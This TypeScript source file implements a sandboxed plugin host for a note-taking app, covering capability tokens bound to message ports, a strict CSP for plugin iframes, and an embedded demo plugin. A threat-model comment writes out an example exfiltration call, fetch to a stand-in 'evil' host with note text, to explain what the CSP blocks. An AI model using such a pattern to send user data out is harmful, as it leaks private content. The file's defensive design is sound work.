import i18n from '../i18n/setup';
import { commands, type Disposable } from './commands';
import { tauriApi } from './tauri-api';

/**
 * Фронт-сторона транспорта плагина (§7.5, ADR-001/002). Каждый плагин живёт в sandbox-iframe и
 * общается с хостом ТОЛЬКО через свой `MessagePort`. Хост открывает сессию (capability-токен, §7.9),
 * привязывает токен к ПОРТУ и обслуживает запросы плагина через `tauriApi.plugins.invoke`.
 *
 * Ключевое свойство безопасности: токен берётся из привязки порта (замыкание `attachPlugin`), а НЕ
 * из payload сообщения. Плагин не знает свой токен и не может предъявить чужой → confused-deputy и
 * capability-laundering закрыты на фронте так же, как identity-по-токену в Rust-брокере.
 */

/** Запрос плагина → хост (по порту). `token` сюда НЕ входит намеренно. */
interface PluginRequest {
  id: number;
  method: string;
  path?: string;
  content?: string;
  /** Для `ui.registerCommand`: команда, которую плагин добавляет в палитру. */
  command?: { id: string; title: string; titleKey?: string };
  /** Для `ui.addTranslations`: `{ локаль → { ключ → строка } }` (namespace `plugin:<id>`). */
  translations?: Record<string, Record<string, string>>;
}

/** Ответ хост → плагин (по порту). */
type PluginResponse =
  | { id: number; ok: true; result: unknown }
  | { id: number; ok: false; error: string };

/** Событие хост → плагин (вне request/response): запуск зарегистрированной плагином команды. */
type PluginEvent = { type: 'command'; commandId: string };

/** Запись обслуженного вызова — для UI-аудита (видно, что и с каким исходом дёрнул плагин). */
export interface PluginCall {
  method: string;
  path?: string;
  ok: boolean;
  error?: string;
}

export interface PluginHostHooks {
  onCall?(call: PluginCall): void;
}

export interface PluginHandle {
  /** Остановить обслуживание плагина (закрыть порт). Вызовы после — игнорируются. */
  dispose(): void;
}

/**
 * Привязывает уже открытую сессию плагина к host-порту канала и обслуживает его запросы.
 * `dir` — каталог плагина (`.nexus/plugins/<dir>`); `hostPort` — порт со стороны хоста (port1).
 * Возвращает хэндл с `dispose()`. Тестируется напрямую (без iframe) через `MessageChannel`.
 */
export async function attachPlugin(
  dir: string,
  hostPort: MessagePort,
  hooks?: PluginHostHooks,
): Promise<PluginHandle> {
  // Токен живёт ТОЛЬКО здесь (host-side). В iframe/плагин не уходит.
  const token = await tauriApi.plugins.openSession(dir);
  // Команды, добавленные плагином в реестр (снимаются при dispose).
  const registered: Disposable[] = [];

  const reply = (resp: PluginResponse) => hostPort.postMessage(resp);

  hostPort.onmessage = (event: MessageEvent) => {
    const msg = event.data as Partial<PluginRequest> | null;
    // Жёсткая валидация формы; мусор молча игнорируем (не отвечаем).
    if (!msg || typeof msg.id !== 'number' || typeof msg.method !== 'string') return;
    const id = msg.id;
    const method = msg.method;

    // ui.addTranslations: плагин добавляет локализованные строки в namespace `plugin:<dir>` (AC-I18N-7).
    // Ключи кладём как `<dir>:<key>` → итоговый i18n-ключ `plugin:<dir>:<key>` (nsSeparator ':').
    if (method === 'ui.addTranslations') {
      const tr = msg.translations;
      if (!tr || typeof tr !== 'object') {
        reply({ id, ok: false, error: 'некорректные переводы' });
        return;
      }
      void tauriApi.plugins
        .invoke(token, 'ui.addTranslations')
        .then(() => {
          // i18next: ключ `plugin:<dir>:<key>` → ns 'plugin' + вложенный путь `<dir>.<key>`,
          // поэтому кладём вложенно `{ <dir>: { <key>: value } }` (не плоской строкой `<dir>:<key>`).
          for (const [locale, dict] of Object.entries(tr)) {
            i18n.addResourceBundle(locale, 'plugin', { [dir]: { ...dict } }, true, true);
          }
          hooks?.onCall?.({ method, ok: true });
          reply({ id, ok: true, result: { locales: Object.keys(tr) } });
        })
        .catch((err: unknown) => {
          const error = err instanceof Error ? err.message : String(err);
          hooks?.onCall?.({ method, ok: false, error });
          reply({ id, ok: false, error });
        });
      return;
    }

    // ui.registerCommand: авторизуем через брокер (право ui:command), регистрируем команду в реестре.
    // run() шлёт событие назад плагину (host→plugin) → плагин исполняет свой обработчик. Снимется в dispose.
    if (method === 'ui.registerCommand') {
      const cmd = msg.command;
      if (!cmd || typeof cmd.id !== 'string' || typeof cmd.title !== 'string') {
        reply({ id, ok: false, error: 'некорректная команда' });
        return;
      }
      void tauriApi.plugins
        .invoke(token, 'ui.registerCommand')
        .then(() => {
          const disp = commands.register({
            id: `plugin:${dir}:${cmd.id}`,
            title: cmd.title,
            // Локализованный заголовок из namespace плагина (если плагин прислал переводы).
            titleKey: cmd.titleKey ? `plugin:${dir}:${cmd.titleKey}` : undefined,
            source: 'plugin',
            run: () => {
              const ev: PluginEvent = { type: 'command', commandId: cmd.id };
              hostPort.postMessage(ev);
            },
          });
          registered.push(disp);
          hooks?.onCall?.({ method, path: cmd.id, ok: true });
          reply({ id, ok: true, result: { registered: cmd.id } });
        })
        .catch((err: unknown) => {
          const error = err instanceof Error ? err.message : String(err);
          hooks?.onCall?.({ method, path: cmd.id, ok: false, error });
          reply({ id, ok: false, error });
        });
      return;
    }

    const path = typeof msg.path === 'string' ? msg.path : undefined;
    const content = typeof msg.content === 'string' ? msg.content : undefined;

    // Токен — из привязки порта, НЕ из msg: даже если плагин подсунет `token` в payload, он
    // игнорируется (тип `PluginRequest` его не содержит, а здесь мы его и не читаем).
    void tauriApi.plugins
      .invoke(token, method, path, content)
      .then((result): PluginResponse => {
        hooks?.onCall?.({ method, path, ok: true });
        return { id, ok: true, result };
      })
      .catch((err: unknown): PluginResponse => {
        const error = err instanceof Error ? err.message : String(err);
        hooks?.onCall?.({ method, path, ok: false, error });
        return { id, ok: false, error };
      })
      .then(reply);
  };
  hostPort.start();

  return {
    dispose() {
      hostPort.onmessage = null;
      registered.forEach((d) => d.dispose()); // снять команды плагина из реестра
      hostPort.close();
      void tauriApi.plugins.closeSession(token); // отзывать сессию в брокере (без утечки токенов)
    },
  };
}

/**
 * Поднимает плагин в sandbox-iframe: открывает сессию, привязывает токен к порту и передаёт парный
 * порт в iframe. Рукопожатие: iframe шлёт `nexus:ready` (его слушатель готов) → хост передаёт порт
 * сообщением `nexus:init` (с transfer). Так нет гонки «послали порт раньше, чем плагин подписался».
 */
export async function mountPlugin(
  dir: string,
  iframe: HTMLIFrameElement,
  hooks?: PluginHostHooks,
): Promise<PluginHandle> {
  const channel = new MessageChannel();
  const handle = await attachPlugin(dir, channel.port1, hooks);

  const onReady = (event: MessageEvent) => {
    if (event.source !== iframe.contentWindow) return; // только от ЭТОГО iframe
    if ((event.data as { type?: unknown } | null)?.type !== 'nexus:ready') return;
    window.removeEventListener('message', onReady);
    // Передаём порт плагину. targetOrigin '*' — sandbox-iframe имеет opaque origin (named нельзя);
    // безопасность держится на том, что порт получает только этот iframe (transfer), а не на origin.
    iframe.contentWindow?.postMessage({ type: 'nexus:init' }, '*', [channel.port2]);
  };
  window.addEventListener('message', onReady);

  const baseDispose = handle.dispose;
  return {
    dispose() {
      window.removeEventListener('message', onReady);
      baseDispose();
    },
  };
}

/**
 * Жёсткая CSP плагинного iframe — контейнмент амбиентного egress (THREAT_MODEL T2). Sandbox-iframe
 * (`allow-scripts`, opaque origin) закрывает доступ к родителю/DOM/storage, но НЕ закрывает сетевой
 * выход: плагин, легитимно прочитав заметку через брокер, мог бы `fetch('https://evil',{body:текст})`
 * / `img.src` / `navigator.sendBeacon` ПРЯМО из iframe, минуя net-allowlist/SSRF-гард брокера. App-CSP
 * на srcdoc в этом WebView НЕ энфорсится (демо на inline-script работает → connect-src тоже не
 * энфорсился → канал был открыт). Поэтому вставляем СВОЮ CSP как первый `<meta http-equiv>` в `<head>`.
 *
 * `connect-src 'none'` (+ img/media/font/form-action 'none') глушит fetch/XHR/beacon/img-пиксель на
 * внешний хост. `script-src`/`style-src 'unsafe-inline'` ОБЯЗАТЕЛЬНЫ: демо использует inline `<script>`
 * и `<style>`; `postMessage` НЕ подпадает под `connect-src` → канал к брокеру (единственный outlet)
 * остаётся жив. `default-src 'none'` закрывает всё прочее (`base-uri`/`frame-src 'none'`).
 *
 * ⚠ Единая точка: любой путь генерации srcdoc обязан прогонять HTML через `withPluginCsp` (untrusted
 * PLUG-2 автоматически получит контейнмент). НЕ хардкодить CSP-строку в двух местах.
 */
export const PLUGIN_CSP =
  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
  "connect-src 'none'; img-src 'none'; media-src 'none'; font-src 'none'; " +
  "form-action 'none'; frame-src 'none'; base-uri 'none'";

/**
 * Вставляет [`PLUGIN_CSP`] ПЕРВЫМ тегом внутрь `<head>` переданного HTML плагина. Единая точка вставки
 * CSP для ЛЮБОГО srcdoc плагина (демо и будущий загружаемый код PLUG-2) — контейнмент egress по T2.
 * `<head>` в шаблоне обязателен (иначе CSP было бы некуда вставить fail-closed) → бросаем при отсутствии.
 */
export function withPluginCsp(html: string): string {
  const meta = `<meta http-equiv="Content-Security-Policy" content="${PLUGIN_CSP}">`;
  const headOpen = html.indexOf('<head>');
  if (headOpen === -1) {
    throw new Error('plugin srcdoc: отсутствует <head> для вставки CSP (контейнмент egress T2)');
  }
  const insertAt = headOpen + '<head>'.length;
  return html.slice(0, insertAt) + meta + html.slice(insertAt);
}

/**
 * HTML демо-плагина (Ф2): крутится в sandbox-iframe (`allow-scripts`, opaque origin — нет доступа к
 * родителю/storage). Через свой порт зовёт host-функции брокера: листинг vault, чтение по клику и
 * демонстрацию ГРАНИЦЫ записи (Notes/ — в scope, README.md — отказ брокера). Реальные плагины будут
 * грузиться из `.nexus/plugins/<id>/` — здесь демо встроено в хост (см. BACKLOG: загрузка ассетов).
 * Egress-контейнмент: srcdoc прогоняется через [`withPluginCsp`] (`connect-src 'none'`, T2).
 */
export function demoPluginSrcdoc(): string {
  return withPluginCsp(`<!doctype html><html lang="ru"><head><meta charset="utf-8"><style>
    body{font:13px/1.5 system-ui,-apple-system,sans-serif;margin:0;padding:12px;color:#dcdce0;background:#1b1b1f}
    h1{font-size:13px;margin:0 0 4px}p.sub{margin:0 0 10px;color:#888}
    ul{list-style:none;margin:0;padding:0}
    li.file,li.dir{padding:3px 6px;border-radius:4px}
    li.file{cursor:pointer}li.file:hover{background:#2d2d33}
    li.dir{color:#7aa2f7}
    pre{white-space:pre-wrap;word-break:break-word;background:#111;padding:8px;border-radius:6px;margin-top:10px;max-height:160px;overflow:auto}
    .err{color:#ff7a7a}.ok{color:#9ece6a}
    button{font:inherit;margin-top:10px;padding:5px 9px;background:#2a2a30;color:#dcdce0;border:1px solid #444;border-radius:5px;cursor:pointer}
    button:hover{border-color:#7aa2f7}
  </style></head><body>
  <h1>🔌 Hello Reader</h1><p class="sub">демо-плагин в песочнице · вызовы идут через capability-брокер</p>
  <div id="app">загрузка…</div>
  <script>
    let port, seq = 0; const pending = {}; const handlers = {};
    function call(method, path, content){
      return new Promise((res, rej) => { const id = ++seq; pending[id] = { res, rej };
        port.postMessage({ id, method, path, content }); });
    }
    function register(cmdId, title, fn, titleKey){ handlers[cmdId] = fn;
      return new Promise((res, rej) => { const id = ++seq; pending[id] = { res, rej };
        port.postMessage({ id, method:'ui.registerCommand', command:{ id: cmdId, title, titleKey } }); }); }
    function addI18n(translations){
      return new Promise((res, rej) => { const id = ++seq; pending[id] = { res, rej };
        port.postMessage({ id, method:'ui.addTranslations', translations }); }); }
    function onMsg(e){ const m = e.data;
      if(m && m.type === 'command'){ const h = handlers[m.commandId]; if(h) h(); return; }
      const p = pending[m.id]; if(!p) return; delete pending[m.id];
      m.ok ? p.res(m.result) : p.rej(new Error(m.error)); }
    async function boot(){
      const app = document.getElementById('app'); app.textContent='';
      const out = document.createElement('pre'); out.textContent='(клик по файлу — прочитать через брокер)';
      try {
        const entries = await call('vault.listFiles', '');
        const ul = document.createElement('ul');
        for (const f of entries){
          const li = document.createElement('li');
          li.className = f.isDir ? 'dir' : 'file';
          li.textContent = (f.isDir ? '📁 ' : '📄 ') + f.name;
          if(!f.isDir) li.onclick = async () => {
            try { out.textContent = await call('vault.readFile', f.path); out.className=''; }
            catch(err){ out.textContent = '✋ ' + err.message; out.className='err'; }
          };
          ul.appendChild(li);
        }
        app.appendChild(ul); app.appendChild(out);
        // Авто-демо: сразу читаем первый файл (read-only) — видно работу брокера без клика.
        const firstFile = entries.find((f) => !f.isDir);
        if(firstFile){ try { out.textContent = '— '+firstFile.path+' —\\n\\n'+await call('vault.readFile', firstFile.path); } catch(_){} }
        // Авто-демо ai.searchSemantic (read-only) — чтобы вызов был виден в аудите.
        try { await call('ai.searchSemantic', undefined, 'roadmap'); } catch(_){}
        const btn = document.createElement('button');
        btn.textContent = 'Проверить границу записи (Notes/ ✓ vs README.md ✗)';
        btn.onclick = async () => {
          let log = '';
          try { const r = await call('vault.writeFile','Notes/Idea.md','# Idea\\n\\nИзменено плагином ✍️\\n');
            log += '✓ Notes/Idea.md записан брокером: '+JSON.stringify(r)+'\\n'; }
          catch(err){ log += '✋ Notes/Idea.md: '+err.message+'\\n'; }
          try { await call('vault.writeFile','README.md','hacked');
            log += '✗ README.md ЗАПИСАН — этого быть не должно!\\n'; }
          catch(err){ log += '✋ README.md отклонён (вне vault:write scope): '+err.message+'\\n'; }
          out.textContent = log; out.className='ok';
        };
        app.appendChild(btn);
        // ai.searchSemantic через брокер (право ai:embed) — RAG-поиск из плагина.
        const aiBtn = document.createElement('button');
        aiBtn.textContent = 'ai.searchSemantic: найти «roadmap»';
        aiBtn.onclick = async () => {
          try { const hits = await call('ai.searchSemantic', undefined, 'roadmap');
            out.textContent = '🔎 «roadmap» →\\n'+hits.map(function(h){return '• '+h.path;}).join('\\n'); out.className=''; }
          catch(err){ out.textContent = '✋ '+err.message; out.className='err'; }
        };
        app.appendChild(aiBtn);
        // Регистрируем команду в палитре приложения (право ui:command). При запуске из палитры хост
        // шлёт событие назад плагину → исполняется этот обработчик (host→plugin раунд-трип).
        const hint = document.createElement('p'); hint.className='sub';
        hint.textContent='⌘P → команда плагина (заголовок локализован: переключи язык 🇷🇺/🇬🇧)';
        app.appendChild(hint);
        // Локализованные строки плагина (namespace plugin:hello) + команда с titleKey (AC-I18N-7).
        await addI18n({ ru:{ readInbox:'Hello Reader: прочитать Inbox.md' }, en:{ readInbox:'Hello Reader: read Inbox.md' } });
        await register('read-inbox', 'Hello Reader: read Inbox.md', async () => {
          try { out.textContent = '▶ команда плагина → Inbox.md\\n\\n'+await call('vault.readFile','Inbox.md'); out.className=''; }
          catch(err){ out.textContent = '✋ '+err.message; out.className='err'; }
        }, 'readInbox');
      } catch(err){ const e=document.createElement('p'); e.className='err'; e.textContent=err.message; app.appendChild(e); }
    }
    // Повторяем «ready», пока хост не пришлёт порт: openSession на host-стороне асинхронен,
    // и первый «ready» может уйти раньше, чем хост подпишется. После init — прекращаем.
    const announce = setInterval(() => parent.postMessage({ type:'nexus:ready' }, '*'), 60);
    window.addEventListener('message', (e) => {
      if(e.data && e.data.type==='nexus:init'){ clearInterval(announce); port = e.ports[0]; port.onmessage = onMsg; port.start(); boot(); }
    });
    parent.postMessage({ type:'nexus:ready' }, '*');
  </script></body></html>`);
}
